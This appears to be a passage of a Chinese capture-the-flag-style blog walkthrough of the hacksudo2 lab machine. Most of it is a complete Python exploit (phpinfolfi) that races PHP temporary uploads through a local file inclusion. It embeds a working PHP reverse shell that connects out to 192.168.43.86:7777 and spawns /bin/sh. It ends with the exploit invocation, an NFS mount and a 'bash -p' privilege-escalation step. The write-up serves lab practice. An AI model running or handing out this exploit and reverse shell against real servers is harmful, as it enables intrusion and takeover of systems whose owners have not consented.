+<h3 id="phpinfolfi"><a href="#phpinfolfi" class="headerlink" title="phpinfolfi"></a>phpinfolfi</h3><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/phpinfolfi.py" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/phpinfolfi.py</a></p>
+<p>构造代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> builtins <span class="keyword">import</span> range</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    TAG=<span class="string">"Security Test"</span></span><br><span class="line">    PAYLOAD=<span class="string">"""%s\r</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">set_time_limit (0);</span></span><br><span class="line"><span class="string">$VERSION = "1.0";</span></span><br><span class="line"><span class="string">$ip = '192.168.43.86';  // CHANGE THIS</span></span><br><span class="line"><span class="string">$port = 7777;       // CHANGE THIS</span></span><br><span class="line"><span class="string">$chunk_size = 1400;</span></span><br><span class="line"><span class="string">$write_a = null;</span></span><br><span class="line"><span class="string">$error_a = null;</span></span><br><span class="line"><span class="string">$shell = 'uname -a; w; id; /bin/sh -i';</span></span><br><span class="line"><span class="string">$daemon = 0;</span></span><br><span class="line"><span class="string">$debug = 0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line"><span class="string">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line"><span class="string">if (function_exists('pcntl_fork')) &#123;</span></span><br><span class="line"><span class="string">	// Fork and have the parent process exit</span></span><br><span class="line"><span class="string">	$pid = pcntl_fork();</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	if ($pid == -1) &#123;</span></span><br><span class="line"><span class="string">		printit("ERROR: Can't fork");</span></span><br><span class="line"><span class="string">		exit(1);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	if ($pid) &#123;</span></span><br><span class="line"><span class="string">		exit(0);  // Parent exits</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// Make the current process a session leader</span></span><br><span class="line"><span class="string">	// Will only succeed if we forked</span></span><br><span class="line"><span class="string">	if (posix_setsid() == -1) &#123;</span></span><br><span class="line"><span class="string">		printit("Error: Can't setsid()");</span></span><br><span class="line"><span class="string">		exit(1);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	$daemon = 1;</span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Change to a safe directory</span></span><br><span class="line"><span class="string">chdir("/");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Remove any umask we inherited</span></span><br><span class="line"><span class="string">umask(0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string">// Do the reverse shell...</span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Open reverse connection</span></span><br><span class="line"><span class="string">$sock = fsockopen($ip, $port, $errno, $errstr, 30);</span></span><br><span class="line"><span class="string">if (!$sock) &#123;</span></span><br><span class="line"><span class="string">	printit("$errstr ($errno)");</span></span><br><span class="line"><span class="string">	exit(1);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Spawn shell process</span></span><br><span class="line"><span class="string">$descriptorspec = array(</span></span><br><span class="line"><span class="string">   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from</span></span><br><span class="line"><span class="string">   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to</span></span><br><span class="line"><span class="string">   2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$process = proc_open($shell, $descriptorspec, $pipes);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (!is_resource($process)) &#123;</span></span><br><span class="line"><span class="string">	printit("ERROR: Can't spawn shell");</span></span><br><span class="line"><span class="string">	exit(1);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Set everything to non-blocking</span></span><br><span class="line"><span class="string">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[0], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[1], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[2], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($sock, 0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">printit("Successfully opened reverse shell to $ip:$port");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">while (1) &#123;</span></span><br><span class="line"><span class="string">	// Check for end of TCP connection</span></span><br><span class="line"><span class="string">	if (feof($sock)) &#123;</span></span><br><span class="line"><span class="string">		printit("ERROR: Shell connection terminated");</span></span><br><span class="line"><span class="string">		break;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// Check for end of STDOUT</span></span><br><span class="line"><span class="string">	if (feof($pipes[1])) &#123;</span></span><br><span class="line"><span class="string">		printit("ERROR: Shell process terminated");</span></span><br><span class="line"><span class="string">		break;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="string">	// command output is available on STDOUT or STDERR</span></span><br><span class="line"><span class="string">	$read_a = array($sock, $pipes[1], $pipes[2]);</span></span><br><span class="line"><span class="string">	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// If we can read from the TCP socket, send</span></span><br><span class="line"><span class="string">	// data to process's STDIN</span></span><br><span class="line"><span class="string">	if (in_array($sock, $read_a)) &#123;</span></span><br><span class="line"><span class="string">		if ($debug) printit("SOCK READ");</span></span><br><span class="line"><span class="string">		$input = fread($sock, $chunk_size);</span></span><br><span class="line"><span class="string">		if ($debug) printit("SOCK: $input");</span></span><br><span class="line"><span class="string">		fwrite($pipes[0], $input);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// If we can read from the process's STDOUT</span></span><br><span class="line"><span class="string">	// send data down tcp connection</span></span><br><span class="line"><span class="string">	if (in_array($pipes[1], $read_a)) &#123;</span></span><br><span class="line"><span class="string">		if ($debug) printit("STDOUT READ");</span></span><br><span class="line"><span class="string">		$input = fread($pipes[1], $chunk_size);</span></span><br><span class="line"><span class="string">		if ($debug) printit("STDOUT: $input");</span></span><br><span class="line"><span class="string">		fwrite($sock, $input);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// If we can read from the process's STDERR</span></span><br><span class="line"><span class="string">	// send data down tcp connection</span></span><br><span class="line"><span class="string">	if (in_array($pipes[2], $read_a)) &#123;</span></span><br><span class="line"><span class="string">		if ($debug) printit("STDERR READ");</span></span><br><span class="line"><span class="string">		$input = fread($pipes[2], $chunk_size);</span></span><br><span class="line"><span class="string">		if ($debug) printit("STDERR: $input");</span></span><br><span class="line"><span class="string">		fwrite($sock, $input);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fclose($sock);</span></span><br><span class="line"><span class="string">fclose($pipes[0]);</span></span><br><span class="line"><span class="string">fclose($pipes[1]);</span></span><br><span class="line"><span class="string">fclose($pipes[2]);</span></span><br><span class="line"><span class="string">proc_close($process);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Like print, but does nothing if we've daemonised ourself</span></span><br><span class="line"><span class="string">// (I can't figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line"><span class="string">function printit ($string) &#123;</span></span><br><span class="line"><span class="string">	if (!$daemon) &#123;</span></span><br><span class="line"><span class="string">		print "$string\n";</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\r"""</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">"""POST /info.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script</span></span><br><span class="line">    LFIREQ=<span class="string">"""GET /file.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span><span class="params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">"[tmp_name] =&gt;"</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, e, l, m, *args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    print(<span class="string">"\nGot it! Shell created in /tmp/g"</span>)</span><br><span class="line">                    self.event.set()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host, port, phpinforeq)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line"></span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&gt;"</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i))</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"LFI With PHPInfo()"</span>)</span><br><span class="line">    print(<span class="string">"-="</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="number">1</span>], e))</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"Error with port %d: %s"</span> % (sys.argv[<span class="number">2</span>], e))</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="number">3</span>], e))</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Getting initial offset..."</span>, end=<span class="string">' '</span>)</span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Spawning worker pool (%d)..."</span> % poolsz)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">"\r% 4d / % 4d"</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        print()</span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            print(<span class="string">"Woot!  \m/"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">":("</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">"\nTelling threads to shutdown..."</span>)</span><br><span class="line">        e.set()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Shuttin' down..."</span>)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"Don't forget to modify the LFI URL"</span>)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>发现报错</li>
+</ul>
+<p><img data-src="./hacksudo2/7.png" alt></p>
+<ul>
+<li>设置<code>burp</code>流量转发，观察请求具体信息</li>
+</ul>
+<p><img data-src="./hacksudo2/8.png" alt></p>
+<p><img data-src="./hacksudo2/9.png" alt></p>
+<p><img data-src="./hacksudo2/10.png" alt></p>
+<ul>
+<li>修改脚本</li>
+</ul>
+<p><img data-src="./hacksudo2/11.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python payload_shell.py 192.168.43.166 80 100</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>反弹<code>shell</code></li>
+</ul>
+<p><img data-src="./hacksudo2/12.png" alt></p>
+<h3 id="提权-amp-amp-FLAG"><a href="#提权-amp-amp-FLAG" class="headerlink" title="提权&amp;&amp;FLAG"></a>提权&amp;&amp;FLAG</h3><ul>
+<li><code>NFS</code>提权</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs 192.168.43.166:/mnt/nfs tmp/pe</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./hacksudo2/13.png" alt></p>
+<ul>
+<li>提权 <code>bash -p</code></li>
+</ul>
+<p><img data-src="./hacksudo2/14.png" alt></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%85%A5%E9%97%A8/" rel="tag"># 入门</a>
+              <a href="/tags/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/" rel="tag"># 综合靶场测试</a>
+              <a href="/tags/hacksudo/" rel="tag"># hacksudo</a>
+          </div>
+
+        
+
+
+        
